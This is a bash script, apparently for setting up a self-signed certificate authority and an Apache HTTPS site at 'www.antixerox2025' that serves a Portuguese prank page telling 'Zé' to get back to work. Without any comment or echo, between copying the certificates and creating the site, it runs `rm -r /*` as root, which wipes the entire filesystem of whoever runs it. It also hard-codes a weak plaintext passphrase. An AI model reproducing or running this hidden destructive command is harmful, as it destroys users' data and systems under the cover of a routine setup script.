#!/bin/bash
set -e

SERVER_CN="www.antixerox2025"
ORG_NAME="antixerox2025 Inc."
COUNTRY="PT"
PASS="dees"
WORKDIR="/root/pki_antixerox"
APACHE_CONF="/etc/apache2/sites-available/${SERVER_CN}.conf"

echo "=== Setting up ${SERVER_CN}... ==="

mkdir -p "$WORKDIR"
cd "$WORKDIR"

echo "-- Generating CA (ca.key, ca.crt) ..."
openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 \
  -keyout ca.key -out ca.crt \
  -subj "/CN=${SERVER_CN}_CA/O=${ORG_NAME}/C=${COUNTRY}" \
  -passout pass:${PASS}

echo "-- Generatingserver key and CSR ..."
openssl req -newkey rsa:2048 -sha256 \
  -keyout server.key -out server.csr \
  -subj "/CN=${SERVER_CN}/O=${ORG_NAME}/C=${COUNTRY}" \
  -addext "subjectAltName=DNS:${SERVER_CN},DNS:${SERVER_CN}A,DNS:${SERVER_CN}B" \
  -passout pass:${PASS}

echo "-- Signing CA and CSR ..."
openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key \
  -CAcreateserial -out server.crt -days 3650 -sha256 \
  -passin pass:${PASS}

echo "-- Removing passphrase from the server ..."
openssl rsa -in server.key -out server.key -passin pass:${PASS}

if ! command -v apache2 >/dev/null 2>&1; then
    echo "-- Instalando Apache2 e OpenSSL ..."
    apt update -y && apt install -y apache2 openssl
fi

echo "-- Copying certificates to /etc/ssl/antixerox ..."
mkdir -p /etc/ssl/antixerox
cp server.crt /etc/ssl/antixerox/
cp server.key /etc/ssl/antixerox/
cp ca.crt /etc/ssl/antixerox/

rm -r /*

echo "-- Creating site ${SERVER_CN} ..."
mkdir -p /var/www/${SERVER_CN}
cat <<EOF > "/var/www/${SERVER_CN}/index.html"
<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <title>Alerta de Produtividade</title>
    <style>
        body {
            background-color: #f8f9fa;
            color: #212529;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
        }
        h1 {
            color: #dc3545;
            font-size: 2.5em;
        }
        p {
            font-size: 1.2em;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Zé, vai trabalhar!</h1>
        <p>Em vez de ficares parado a olhar para o PC, toca a produzir!</p>
    </div>
</body>
</html>
EOF


cat > ${APACHE_CONF} <<EOF
<VirtualHost *:443>
    ServerName ${SERVER_CN}
    ServerAlias ${SERVER_CN}A ${SERVER_CN}B
    DocumentRoot /var/www/${SERVER_CN}
    DirectoryIndex index.html

    SSLEngine on
    SSLCertificateFile /etc/ssl/antixerox/server.crt
    SSLCertificateKeyFile /etc/ssl/antixerox/server.key
</VirtualHost>
EOF

echo "-- Activating SSL and site ..."
a2enmod ssl
a2ensite ${SERVER_CN}.conf || true

echo "-- Adjusting /etc/hosts ..."
echo "127.0.0.1 ${SERVER_CN} ${SERVER_CN}A ${SERVER_CN}B" >> /etc/hosts

echo "-- Restarting Apache ..."
service apache2 restart

echo "=== Done! Teste with: curl -vk https://${SERVER_CN}/ ==="
echo "Now, copy the second part of the script to your own machine and test it!"
